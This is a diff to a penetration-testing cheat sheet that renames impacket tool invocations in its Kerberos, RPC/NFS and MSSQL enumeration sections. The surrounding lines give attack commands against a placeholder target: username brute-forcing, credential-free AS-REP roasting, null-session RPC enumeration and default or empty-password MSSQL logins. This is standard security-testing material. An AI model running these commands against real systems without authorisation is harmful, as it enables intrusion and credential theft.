@@ -351,7 +351,7 @@ nmap -sV -p88 --script krb5-enum-users TARGET_IP
 kerbrute userenum -d DOMAIN --dc TARGET_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
 # AS-REP Roasting (no creds needed)
-impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -outputfile asrep_hashes.txt
+GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -outputfile asrep_hashes.txt
 ```
 
 **Quick wins:** AS-REP roastable accounts, valid username enumeration.
@@ -368,7 +368,7 @@ showmount -e TARGET_IP  # NFS shares
 # Windows RPC
 rpcclient -U "" -N TARGET_IP
 rpcclient -U "" -N TARGET_IP -c "enumdomusers;enumdomgroups;getdompwinfo"
-impacket-rpcdump TARGET_IP | grep -E "Protocol|Provider"
+rpcdump.py TARGET_IP | grep -E "Protocol|Provider"
 ```
 
 **Quick wins:** Null session user enumeration, NFS shares with no_root_squash,
@@ -432,7 +432,7 @@ enumeration inline.
 nmap -sV -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info TARGET_IP
 
 # Auth check
-impacket-mssqlclient sa:password@TARGET_IP
+mssqlclient.py sa:password@TARGET_IP
 netexec mssql TARGET_IP -u sa -p '' --local-auth  # Empty password check
 
 # NTLM info leak
